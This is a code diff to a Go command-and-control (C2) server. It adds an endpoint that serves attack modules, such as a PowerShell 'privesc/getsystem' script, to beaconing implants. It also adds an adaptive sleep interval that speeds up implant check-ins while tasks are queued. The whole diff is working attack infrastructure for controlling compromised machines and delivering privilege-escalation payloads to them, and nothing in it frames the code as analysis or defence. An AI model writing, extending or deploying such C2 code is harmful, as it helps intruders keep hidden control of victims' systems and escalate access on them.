@@ -21,17 +21,18 @@ import (
 
 // Server handles C2 server operations
 type Server struct {
-	config *core.Config
-	logger interface {
+	config       *core.Config
+	logger       interface {
 		Info(string, ...interface{})
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
 	}
-	sessions   map[string]*Session
-	sessionsMu sync.RWMutex
-	handler    *http.ServeMux
-	server     *http.Server
-	taskQueue  *tasks.Queue
+	sessions     map[string]*Session
+	sessionsMu   sync.RWMutex
+	handler      *http.ServeMux
+	server       *http.Server
+	taskQueue    *tasks.Queue
+	moduleGetter func(string) (string, error) // Function to get module script by ID
 }
 
 // Session represents a client session
@@ -70,6 +71,11 @@ func NewServerWithTaskQueue(config *core.Config, logger interface {
 	return s
 }
 
+// SetModuleGetter sets the function to retrieve module scripts
+func (s *Server) SetModuleGetter(getter func(string) (string, error)) {
+	s.moduleGetter = getter
+}
+
 func (s *Server) setupRoutes() {
 	// Beacon endpoint
 	s.handler.HandleFunc("/beacon", s.handleBeacon)
@@ -79,6 +85,9 @@ func (s *Server) setupRoutes() {
 
 	// Result endpoint
 	s.handler.HandleFunc("/result", s.handleResult)
+	
+	// Module endpoint
+	s.handler.HandleFunc("/module/", s.handleModule)
 
 	// Health check
 	s.handler.HandleFunc("/health", s.handleHealth)
@@ -256,10 +265,20 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	tasks := s.getPendingTasks(sessionID)
 	s.logger.Debug("Returning %d pending tasks for session %s", len(tasks), sessionID)
 
+	// Calculate adaptive sleep interval
+	// If there are pending tasks, use shorter interval (1-2 seconds)
+	// Otherwise use configured sleep interval
+	adaptiveSleep := s.config.Communication.Sleep.Seconds()
+	if len(tasks) > 0 {
+		// Active tasking - use fast interval (1-2 seconds with jitter)
+		adaptiveSleep = 1.5 // Base 1.5 seconds when tasks are pending
+		s.logger.Debug("Adaptive sleep: tasks pending, using fast interval %.2fs", adaptiveSleep)
+	}
+
 	response := map[string]interface{}{
 		"session_id": sessionID,
 		"tasks":      tasks,
-		"sleep":      s.config.Communication.Sleep.Seconds(),
+		"sleep":      adaptiveSleep,
 		"jitter":     s.config.Communication.Jitter,
 	}
 
@@ -275,6 +294,46 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	if newSessionCreated {
 		// This will be handled by syncSessionsWithContext
 	}
+}
+
+func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	
+	// Extract module ID from URL path (/module/powershell/privesc/getsystem)
+	moduleID := strings.TrimPrefix(r.URL.Path, "/module/")
+	if moduleID == "" {
+		http.Error(w, "Module ID required", http.StatusBadRequest)
+		return
+	}
+	
+	s.logger.Debug("Module request for %s from %s", moduleID, r.RemoteAddr)
+	
+	if s.moduleGetter == nil {
+		http.Error(w, "Module getter not configured", http.StatusInternalServerError)
+		return
+	}
+	
+	script, err := s.moduleGetter(moduleID)
+	if err != nil {
+		s.logger.Error("Failed to get module %s: %v", moduleID, err)
+		http.Error(w, fmt.Sprintf("Module not found: %s", moduleID), http.StatusNotFound)
+		return
+	}
+	
+	response := map[string]interface{}{
+		"script": script,
+	}
+	
+	w.Header().Set("Content-Type", "application/json")
+	if err := json.NewEncoder(w).Encode(response); err != nil {
+		s.logger.Error("Failed to encode module response: %v", err)
+		return
+	}
+	
+	s.logger.Debug("Module script sent for %s", moduleID)
 }
 
 func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
